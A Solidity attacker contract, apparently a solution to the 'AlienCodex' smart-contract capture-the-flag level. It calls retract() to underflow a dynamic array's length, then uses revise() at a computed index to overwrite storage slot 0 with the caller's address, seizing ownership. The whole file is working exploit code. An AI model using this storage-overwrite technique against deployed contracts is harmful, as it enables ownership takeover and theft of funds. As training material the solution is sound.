// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface IAlienCodex {
    function make_contact() external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexAttacker {
    IAlienCodex public instance;

    constructor(address _instance) public {
        instance = IAlienCodex(_instance);
    }

    function attack() public {
        uint256 codexLocation = uint256(keccak256(abi.encode(1)));
        uint256 lastStorageSlot = type(uint256).max - codexLocation;

        instance.make_contact();
        instance.retract();

        instance.revise(lastStorageSlot + 1, bytes32(uint256(uint160(tx.origin))));
    }
}
